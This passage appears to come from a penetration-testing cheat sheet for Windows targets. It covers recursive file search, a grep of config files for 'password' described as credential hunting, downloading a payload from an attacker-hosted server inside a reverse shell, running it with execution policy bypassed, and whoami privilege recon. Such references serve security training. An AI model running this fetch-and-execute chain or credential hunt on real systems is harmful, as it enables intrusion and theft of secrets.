Get-ChildItem -Path C:\ -Recurse -Include "<filename>" -Force -ErrorAction SilentlyContinue

# cmd.exe equivalent -- /s recurses from the given path, /b gives bare path output
dir /s /b C:\<filename>

# NOTE: dir /s /b <filename>   (no path) searches from your CURRENT directory down only.
#       dir /s /b C:\<filename> searches the entire C: drive from root down.

# where -- closest equivalent to `which`; searches PATH by default
where <filename>.exe
where /r C:\ <filename>.exe    # /r recurses a specific directory instead of PATH

# Search file CONTENTS across many files (PowerShell grep-equivalent) --
# useful for credential hunting in configs
Get-ChildItem -Path C:\ -Recurse -Include *.config,*.txt -ErrorAction SilentlyContinue |
    Select-String "password"
```

> NOTE: Windows has no direct equivalent to Linux `find` with its predicate-based syntax.
> `find.exe` exists on Windows but is a legacy content-search tool (closer to `grep`),
> not a filesystem-traversal tool -- don't expect Linux `find` flags to work with it.

### Transferring Files to a Windows Target

```powershell
# From within a PowerShell reverse shell -- pull a file from your attacker-hosted server
Invoke-WebRequest -Uri "http://<your-ip>:8000/<file>" -OutFile "C:\Windows\Temp\<file>"

# Execution policy commonly blocks unsigned scripts by default -- bypass per-invocation
# (does not change any persistent system setting)
powershell -ExecutionPolicy Bypass -File C:\Windows\Temp\<script>.ps1
```

Notes:
- Extension on your attacker-side hosted file doesn't matter for serving it -- an HTTP
  server sends bytes regardless of name. What matters is the extension you assign via
  `-OutFile` on the target, since PowerShell decides how to treat a file by its extension
  (`.ps1` for `-File`, not `.sh` or arbitrary names).
- No Linux-style `chmod +x` step exists or is needed anywhere in this transfer/execution
  chain -- Windows has no execute-bit equivalent; the only real gate is PowerShell's
  execution policy, handled above with `-ExecutionPolicy Bypass`.

### Privilege / Identity Recon Quick Reference

```powershell
whoami                  # current user
whoami /priv             # privileges and their enabled/disabled state
whoami /groups           # local + well-known group memberships
whoami /all              # combined identity + groups + privileges
$PSVersionTable          # confirm PowerShell version (cmdlet availability varies)
```

---


